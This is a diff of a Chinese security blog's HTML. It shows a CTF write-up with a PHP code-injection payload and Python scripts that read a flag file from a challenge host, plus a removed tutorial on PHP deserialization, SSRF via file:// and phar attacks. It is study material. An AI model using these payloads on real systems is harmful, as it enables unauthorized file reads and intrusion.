+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A8/3.png"></p>
 <p>成功执行，在题目上进行测试。</p>
-<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97/16.png"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A8/4.png"></p>
 <p>提示在var/www/html/index.php上不存在flag文件，想到了返回上一级目录。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and print_r(readfile(&quot;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag&quot;))</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97/17.png"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A8/5.png"></p>
 <p><strong>在通过python脚本获取flag之前，我们需要对python脚本有一些了解。</strong></p>
 <h3 id="Python-HTTP请求"><a href="#Python-HTTP请求" class="headerlink" title="Python-HTTP请求"></a>Python-HTTP请求</h3><p>requests模块发送请求有data、params两种携带参数的方法。</p>
 <p>params在get请求中使用，data在post请求中使用。</p>
@@ -1296,7 +1475,7 @@
 <p>因为网站跟目录里面有一个app的文件夹，所以返回</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url:http:&#x2F;&#x2F;127.0.0.1&#x2F;app&#x2F;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97/1.png"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A8/6.png"></p>
 <p>因为网站根目录里面没有Hello，World，haha的文件夹，所以会返回404</p>
 <p>存在app的文件夹，所以会返回200</p>
 <h4 id="参数优化"><a href="#参数优化" class="headerlink" title="参数优化"></a>参数优化</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">argv是sys模块的一个全局变量，也称sys模块的一个属性！argv本身为一个list类型的对象，Sys.argv[]是用来获取命令行参数的，sys.argv[0]表示代码本身文件路径，所以参数从1开始。argv[1]代表传入的第一个命令行参数</span><br><span class="line"></span><br><span class="line">注意：argv持有的每个元素的类型均为str（字符串）</span><br></pre></td></tr></table></figure>
@@ -1305,25 +1484,25 @@
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url=sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="comment">#url = &quot;http://127.0.0.1/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open (<span class="string">&quot;1.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)<span class="keyword">as</span> f:</span><br><span class="line">	<span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">		line = line.strip()</span><br><span class="line">		r = requests.get(url+line)</span><br><span class="line">		<span class="comment">#print(r)</span></span><br><span class="line">		<span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">			print(<span class="string">&quot;url:&quot;</span>+r.url)</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97/2.png"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A8/7.png"></p>
 <h3 id="第二种解法"><a href="#第二种解法" class="headerlink" title="第二种解法"></a>第二种解法</h3><p>有了以上知识，可以开始编写脚本</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import requests  #导入requests模块</span><br><span class="line">import re        #导入re模块</span><br><span class="line">r &#x3D; requests.session();   </span><br><span class="line">result&#x3D;r.get(&quot;http:&#x2F;&#x2F;47.98.234.232:28054&quot;)</span><br><span class="line">print(result.text)</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97/21.png"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A8/8.png"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可以得到在&lt;h4&gt;里面就是我们需要利用的内容</span><br><span class="line"></span><br><span class="line">写一个正则匹配&lt;h4&gt;</span><br><span class="line">&lt;h4&gt;(.*?)&lt;&#x2F;h4&gt;</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.findall  的简单用法（返回string中所有与pattern相匹配的全部字串，返回形式为数组）</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97/22.png"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A8/9.png"></p>
 <p><strong>url拼接</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests  #导入requests模块</span><br><span class="line">import re        #导入re模块</span><br><span class="line">r &#x3D; requests.session();   </span><br><span class="line">result&#x3D;r.get(&quot;http:&#x2F;&#x2F;47.98.234.232:28054&quot;)</span><br><span class="line">expr&#x3D;re.findall(&quot;&lt;h4&gt;(.*?)&lt;&#x2F;h4&gt;&quot;,result.text)</span><br><span class="line">print(eval(expr[0]))</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;47.98.234.232:28054?a&#x3D;%s&quot;%str(eval(expr[0]))+&quot; and print_r(readfile(&#39;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag&#39;))&quot;</span><br><span class="line">print(url)</span><br><span class="line">a&#x3D;r.get(url)</span><br><span class="line">if &quot;Try again!&quot; not in a.text:</span><br><span class="line">	print(&quot;yes&quot;)</span><br><span class="line">print(a.text)</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97/18.png"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A8/10.png"></p>
 <p><strong>到这里发现不用返回那么多级目录，在文件名前面加一个/就可以了！！！</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;47.98.234.232:28054?a&#x3D;%s&quot;%str(eval(expr[0]))+&quot; and print_r(file_get_contents(&#39;&#x2F;flag&#39;))&quot;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97/20.png"></p>
-<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97/19.png"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A8/11.png"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A8/12.png"></p>
 
       
     </div>
@@ -1723,202 +1902,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://www.yoyo2tong.xyz/2020/10/09/xiuleihua/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/1.jpg">
-      <meta itemprop="name" content="zoey">
-      <meta itemprop="description" content="Hello!">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="zoey">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/10/09/xiuleihua/" class="post-title-link" itemprop="url">反序列化漏洞</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-10-09 17:58:04" itemprop="dateCreated datePublished" datetime="2020-10-09T17:58:04+08:00">2020-10-09</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-11-15 15:13:05" itemprop="dateModified" datetime="2020-11-15T15:13:05+08:00">2020-11-15</time>
-              </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>6.8k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>6 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p><strong>把对象转换为字节序列的过程称为对象的序列化</strong>；<strong>把字节序列恢复为对象的过程称为对象的反序列化</strong>。</p>
-<p>对象的序列化主要有两种用途：</p>
-<p>1） 把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中；</p>
-<p>2） 在网络上传送对象的字节序列。</p>
-<p>序列化和反序列化本身并不存在问题。但当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。</p>
-<p>常见的php系列化和反系列化方式主要有：serialize，unserialize；json_encode，json_decode</p>
-<h4 id="漏洞触发条件"><a href="#漏洞触发条件" class="headerlink" title="漏洞触发条件"></a>漏洞触发条件</h4><p>unserialize函数，json_decode函数变量可控，php文件中存在可利用的类，类中有魔术方法</p>
-<p>php将所有以 __ (两个下划线) 开头的类方法保留为魔术方法</p>
-<p><strong>常用的魔术方法</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__construct()  当一个对象创建时自动调用</span><br><span class="line">__wakeup()     使用unserialse()函数时会自动调用</span><br><span class="line">__destruct()   当对象被销毁时自动调用（php绝大多数情况下会自动调用销毁对象）</span><br><span class="line">__sleep()      使用serialize()函数是触发</span><br><span class="line">__toString()  把类当作字符串使用时触发，返回值需要为字符串</span><br><span class="line">    (例如一个类A,实例化之后为$a,<span class="keyword">echo</span> $a, 或者$a与字符串对比，这时就会触发该函数)</span><br></pre></td></tr></table></figure>
-
-<h4 id="不同属性序列化"><a href="#不同属性序列化" class="headerlink" title="不同属性序列化"></a>不同属性序列化</h4><p>Public属性序列化后格式:成员名</p>
-<p>Private属性序列化后格式:%00类名%00成员名</p>
-<p>Protected属性序列化后的格式:%00*%00成员名</p>
-<p>new类名()：调用这个类的构造函数初始化对象，类名（）这个是构造函数，用来初始化。</p>
-<p>在进行类的序列化时 私有属性 会加空白字符类名空白字符；保护属性会加 * （注意空白字符不是空格，空格的16进制为20，空白字符的16进制为00）</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDHDJCPDCCOHAGOGH"></p>
-<h4 id="在类外定义类中的值"><a href="#在类外定义类中的值" class="headerlink" title="在类外定义类中的值"></a>在类外定义类中的值</h4><p><strong>重新定义类中属性的值</strong></p>
-<p>通过new 类名 （”对类中的变量重新定义“）</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDIDBCPDDCOHAGOGH"></p>
-<p><strong>在类的外面定义类中的函数并调用方法</strong></p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDIDACPDFCOHAGOGH"></p>
-<h3 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="wakeup绕过"></a>wakeup绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__wakeup 使用unserialse（）函数时会自动调用</span><br><span class="line">但是序列化字符串中表示对象属性个数的值大于 真实的属性个数时会跳过__wakeup的执行</span><br><span class="line"></span><br><span class="line">CVE-2016-7124(绕过__wakeup)</span><br><span class="line">漏洞影响版本：</span><br><span class="line">PHP5 &lt; 5.6.25</span><br><span class="line">PHP7 &lt; 7.0.10</span><br></pre></td></tr></table></figure>
-
-<h3 id="OC绕过"><a href="#OC绕过" class="headerlink" title="OC绕过"></a>OC绕过</h3><p>OC绕过是通过修改O：数字（C：数字）来绕过正则匹配</p>
-<p>例：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/&#x27;</span>,$var))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//若传入的参数有匹配了这个正则，则输入错误。</span></span><br><span class="line">我们可以使用+号当做空格绕过，即O:+<span class="number">4</span>即可绕过。</span><br></pre></td></tr></table></figure>
-
-<h3 id="私有属性绕过"><a href="#私有属性绕过" class="headerlink" title="私有属性绕过"></a>私有属性绕过</h3><p>私有属性产生的一些不可见字符如果被过滤掉，可以用字符编码来替换这些字符进行绕过。</p>
-<p>例：当反序列化中的属性是private时，在url输入payload时空字符不能被识别，会导致反序列化失败，我们可以在把空字符转换为16进制绕过。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\00就是16进制的chr（0）</span><br><span class="line">%00是chr(0)的url编码</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDIDGCPDEDDDHCOHAGOGH"></p>
-<p>可以看出，当属性为private时，例：private $address = ‘shanxi’,反序列化的时候应为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\00test\00address</span><br></pre></td></tr></table></figure>
-
-<p>当属性为protected时，例：protected $age = ‘21’,反序列化的时候应该为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\00*\00age</span><br></pre></td></tr></table></figure>
-
-<p>当代码过滤一些字符的时候<code>例如：flag</code>，我们可以通过16进制编码把flag编写为16进制，这时我们可以把表示字符串的字符s改为大写，这样它在反序列化的时候就能识别16进制，既可以绕过过滤，又可以成功执行反序列化。</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDIDCCPDEDDDICOHAGOGH"></p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDIDDCPDEDDDJCOHAGOGH"></p>
-<p>可以看到，当s为大写时，可以成功识别16进制。</p>
-<h4 id="unserialize4"><a href="#unserialize4" class="headerlink" title="unserialize4"></a>unserialize4</h4><p>cURL会话</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">初始化一个新的cURL会话并获取一个网页</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 创建一个新cURL资源</span></span><br><span class="line">$ch = curl_init();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置URL和相应的选项</span></span><br><span class="line">curl_setopt($ch, CURLOPT_URL, <span class="string">&quot;http://www.runoob.com/&quot;</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 抓取URL并把它传递给浏览器</span></span><br><span class="line">curl_exec($ch);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭cURL资源，并且释放系统资源</span></span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//创建cURL就可以使用一些协议读取和执行相关命令</span></span><br><span class="line">   <span class="comment">// http://www.xxx.com/ssrf.php?url=file:///flag</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $a;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $b = strpos(<span class="keyword">$this</span>-&gt;a, <span class="string">&#x27;flag&#x27;</span>);<span class="comment">//strpos()函数查找字符串在另一字符串中第一次出现的位置。如果                                         flag在a中出现过，则$b为真</span></span><br><span class="line">        <span class="keyword">if</span>($b) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $c = curl_init();<span class="comment">//初始化一个cURL会话</span></span><br><span class="line">        </span><br><span class="line">        curl_setopt($c, CURLOPT_URL, <span class="keyword">$this</span>-&gt;a);<span class="comment">//设定请求的url</span></span><br><span class="line">        curl_setopt($c, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);<span class="comment">//	启用时会将头文件的信息作为数据流输出。 参数为1表示输出信息头,为0表示不输出</span></span><br><span class="line">        curl_setopt($c, CURLOPT_CONNECTTIMEOUT, <span class="number">5</span>);</span><br><span class="line">        <span class="keyword">echo</span> curl_exec($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&quot;z&quot;</span>])) &#123;</span><br><span class="line">    unserialize($_GET[<span class="string">&quot;z&quot;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//由于一次GET传输会先进行URL解码，这里对字母a进行双url编码</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDIDECPDEDFDCCOHAGOGH"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">O:5:&quot;Hello&quot;:1:&#123;S:4:&quot;%00*%00a&quot;;S:14:&quot;file:&#x2F;&#x2F;&#x2F;fl%25%36%31g&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h3><p>反序列化字符串都是以一<code>&quot;;&#125;</code>结束的，所以如果我们把<code>&quot;;&#125;</code>带入需要反序列化的字符串中（除了结尾处），就能让反序列化提前闭合结束，后面的内容就丢弃了。</p>
-<p>在反序列化的时候php会根据s所指定的字符长度去读取后边的字符,我们可以根据需求指定s的长度。</p>
-<p>例：字符逃逸将age从13变成35。</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDIDFCPDEDCDACOHAGOGH"></p>
-<h3 id="PHar反序列化"><a href="#PHar反序列化" class="headerlink" title="PHar反序列化"></a>PHar反序列化</h3><p>Phar反序列化可以在不使用php函数unserialize（）的前提下，进行php反序列化漏洞。</p>
-<p>大多数PHP文件操作允许使用各种URL协议去访问文件路径：如<code>data://</code>，<code>zlib://</code>或<code>php://</code>。<br>例如常见的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include(&#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php&#39;);</span><br><span class="line">include(&#39;data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxxxxxxxxxx&#39;);</span><br></pre></td></tr></table></figure>
-
-<p><code>phar://</code>也是流包装的一种</p>
-<h4 id="phar原理"><a href="#phar原理" class="headerlink" title="phar原理"></a>phar原理</h4><p>phar的本质是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p>
-<p>phar文件类似zip和jar，它将PHP文件打包成一个文件然后PHP可以在不解压的情况下去访问这个包里面的php，并执行。</p>
-<h4 id="phar文件标识"><a href="#phar文件标识" class="headerlink" title="phar文件标识"></a>phar文件标识</h4><p><strong>1，a stub</strong></p>
-<p>可以理解为一个标志，格式为<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
-<p><strong>2，manifest</strong></p>
-<p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p>
-<p><strong>3，contents</strong></p>
-<p>被压缩文件的内容。</p>
-<p><strong>4，signature</strong></p>
-<p>签名，发在文件末尾。</p>
-<h4 id="构建phar文件"><a href="#构建phar文件" class="headerlink" title="构建phar文件"></a>构建phar文件</h4><p><strong>将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。不同的php.ini文件对应着phpstudy的不同版本。</strong></p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDIDHCPDEDCDBCOHAGOGH"></p>
-<p><strong>执行下面的文本生成phar文件</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar，文件名可自己设置，例·：test.php</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $o -&gt; data=<span class="string">&#x27;hu3sky&#x27;</span>;<span class="comment">//类中有一个属性data,属性值为hu3sky</span></span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//该文本的文件名为phar.php</span></span><br></pre></td></tr></table></figure>
-
-<p>修改php-5.5.38文件，可以看到成功执行，生成phar文件。</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDJDACPDEDCDICOHAGOGH"></p>
-<h4 id="打开phar文件"><a href="#打开phar文件" class="headerlink" title="打开phar文件"></a>打开phar文件</h4><p>可以看到该phar文件由四部分组成，文件标识（__HALT_COMPILER()）</p>
-<p>manifest（反序列化内容） ，压缩文件内容，签名。</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDIDICPDEDDDFCOHAGOGH"></p>
-<h4 id="利用phar文件"><a href="#利用phar文件" class="headerlink" title="利用phar文件"></a>利用phar文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当用phar:&#x2F;&#x2F;访问phar文件时，会触发反序列化，会触发魔法函数。</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDIDJCPDEDEDJCOGKHAGH"></p>
-<p>当在setStub添加图片文件头，可以绕过图片头检测。</p>
-<p><img src="https://zhuang-yongyi.gitee.io/yoyo/431.png"></p>
-<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>只要phar://协议解析文件的时候，就会造成序列化的问题，所以文件操作的函数都可以触发这种序列化：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">fileatime / filectime / filemtime</span><br><span class="line">stat / fileinode / fileowner / filegroup / fileperms</span><br><span class="line">file / file_get_contents / readfile / `fopen``</span><br><span class="line">file_exists / is_dir / 